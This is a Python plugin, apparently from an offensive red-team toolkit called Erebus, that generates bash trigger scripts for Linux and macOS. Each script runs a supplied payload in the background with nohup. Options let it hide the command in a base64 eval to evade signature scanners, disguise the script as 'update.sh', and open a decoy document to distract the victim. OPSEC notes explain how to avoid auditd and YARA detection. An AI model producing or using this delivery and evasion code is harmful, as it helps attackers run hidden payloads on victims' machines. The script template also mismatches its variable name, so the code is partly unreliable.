"""
Erebus Plugin - Bash Script Trigger
Author: Whispergate
Description: Creates .sh bash script triggers for Linux and macOS targets.

Execution paths:
  Linux  → double-click (if file manager configured) or terminal execution
  macOS  → terminal execution or chained from .command wrapper

Payload runs detached via nohup so the shell that spawned the script exits
immediately, leaving no zombie parent.  Optional base64 obfuscation wraps the
command in an eval to frustrate static string scanners.
"""

import base64
import pathlib
import random
import string
from typing import Dict, Callable, Optional, Literal

try:
    from erebus_wrapper.erebus.modules.plugin_base import ErebusPlugin, PluginMetadata, PluginCategory
except ImportError:
    from plugin_base import ErebusPlugin, PluginMetadata, PluginCategory


class BashTriggerPlugin(ErebusPlugin):
    """
    Plugin for creating bash script (.sh) triggers targeting Linux and macOS.

    The script background-executes the supplied command via nohup and optionally
    opens a decoy document to distract the victim.  Two obfuscation levels are
    supported: plaintext (no obfuscation) and base64 eval (command string wrapped
    in base64, decoded and eval'd at runtime to break static string signatures).
    """

    def __init__(self):
        super().__init__()
        self.REPO_ROOT = pathlib.Path(__file__).resolve().parents[2]
        self.AGENT_CODE = self.REPO_ROOT / "agent_code"
        self.PAYLOAD_DIR = self.AGENT_CODE / "payload"

    def get_metadata(self) -> PluginMetadata:
        return PluginMetadata(
            name="bash_trigger",
            version="1.0.0",
            author="Whispergate",
            description="Creates bash (.sh) script triggers for Linux and macOS via nohup background execution",
            category=PluginCategory.TRIGGER,
            enabled=True,
        )

    def register(self) -> Dict[str, Callable]:
        return {
            "create_bash_trigger": self.create_bash_trigger,
        }

    def validate(self) -> tuple[bool, Optional[str]]:
        return (True, None)

    def on_load(self):
        print("[Plugin] Bash Trigger plugin loaded - Supporting Linux/macOS .sh delivery")

    # ================================================================
    # Helpers
    # ================================================================

    @staticmethod
    def _rand_var(n: int = 6) -> str:
        return "_" + "".join(random.choices(string.ascii_lowercase, k=n))

    @staticmethod
    def _b64_obfuscate(command: str) -> str:
        """Wrap command in base64 eval to break static string matching."""
        encoded = base64.b64encode(command.encode()).decode()
        return f'eval "$(echo {encoded} | base64 -d)"'

    # ================================================================
    # Plugin Functions
    # ================================================================

    def create_bash_trigger(
        self,
        command: str,
        output_filename: str = "update.sh",
        payload_dir: Optional[pathlib.Path] = None,
        obfuscate: bool = True,
        decoy_path: str = "",
        target_os: str = "Linux",
    ) -> pathlib.Path:
        """
        Create a bash (.sh) trigger script for Linux or macOS.

        Args:
            command:         Shell command to execute (e.g. './payload').
            output_filename: Output script filename.
            payload_dir:     Directory to write the script into.
            obfuscate:       Wrap command in base64 eval to obscure the payload path.
            decoy_path:      Optional decoy document to open alongside execution.
            target_os:       "Linux" or "macOS" - controls decoy opener binary.

        Returns:
            pathlib.Path: Path to the created .sh file.

        ## OPSEC Notes
        Detection Surface:
          - bash spawning background process generates audit log entries (auditd)
          - nohup writes to nohup.out unless redirected - script redirects to /dev/null
          - base64 eval pattern is detectable by YARA (base64 + eval) but requires
            the scanner to have the specific rule; far less common on Linux/macOS
        Hardening:
          - [MALLEABLE] Combine with .desktop or .command wrapper to trigger via
            user double-click rather than explicit terminal execution
          - [MALLEABLE] Replace nohup with setsid for cleaner process group detachment
        Evasion Maturity: Level 1 (Basic) - bash is not monitored by default on
          most Linux endpoints; macOS Endpoint Security requires explicit subscription.
        """
        if payload_dir is None:
            payload_dir = self.PAYLOAD_DIR
        payload_dir = pathlib.Path(payload_dir)
        payload_dir.mkdir(parents=True, exist_ok=True)

        opener = "xdg-open" if target_os == "Linux" else "open"

        if obfuscate:
            exec_line = self._b64_obfuscate(command)
        else:
            exec_line = command

        # Variable used to suppress nohup.out
        v_null = self._rand_var()

        decoy_block = ""
        if decoy_path:
            decoy_block = f'\n{opener} "{decoy_path}" >/dev/null 2>&1 &'

        script = f"""#!/usr/bin/env bash
{v_null}=/dev/null
nohup bash -c '{exec_line}' >"${{{v_null[1:]}}}" 2>&1 &{decoy_block}
"""
        output_path = payload_dir / output_filename
        output_path.write_text(script, encoding="utf-8")
        return output_path


# Module-level instance for plugin auto-discovery
_plugin = BashTriggerPlugin()


if __name__ == "__main__":
    _metadata = _plugin.get_metadata()
    print(f"[*] {_metadata.name} v{_metadata.version}")
    print(f"[*] Category: {_metadata.category.value}")
    print(f"[*] Description: {_metadata.description}")
    print()
    registered = _plugin.register()
    print(f"[*] Registered functions ({len(registered)}):")
    for fn in sorted(registered):
        print(f"    - {fn}")
    print()
    valid, err = _plugin.validate()
    print("[+] Validation passed" if valid else f"[-] Validation failed: {err}")
